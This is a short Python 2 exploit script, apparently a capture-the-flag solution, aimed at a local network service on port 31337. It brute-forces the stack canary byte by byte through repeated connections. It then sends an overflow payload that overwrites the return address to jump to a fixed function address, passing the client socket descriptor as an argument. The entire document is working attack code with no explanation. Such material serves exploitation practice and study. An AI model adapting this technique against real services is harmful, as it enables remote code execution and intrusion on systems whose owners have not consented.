#!/usr/bin/python
import struct
import socket
import time
def p32(val):
  return struct.pack("<I", val)
def u32(val):
  return struct.unpack("<I", val)[0]
def recvuntil(sock, needle):
  res = ''
  while True:
    res += sock.recv(1)
    if needle in res:
      return res
IP = '127.0.0.1'
PORT = 31337
# First byte of canary is NULL byte
canary = '\x00'
for _ in range(3):
  for i in range(256):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    recvuntil(s, "What is your name? ")
    payload = "A"*0x20
    payload += canary + chr(i)
    s.send(payload)
    res = s.recv(1024)
    if 'See you again.' in res:
      canary += chr(i)
      print `canary`
      s.close()
      break
    s.close()
print `"Stack Canary : " + canary`
CRITICAL_ADDR = 0x080486db 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
client_fd = u32(s.recv(4))
print "client fd : %d"%client_fd
recvuntil(s, "What is your name? ")
payload = "A"*0x20
payload += canary
payload += "B"*0xc
payload += p32(CRITICAL_ADDR)
payload += p32(0xdeadbeef)
payload += p32(client_fd)
s.send(payload)
print `s.recv(1024)`
s.close()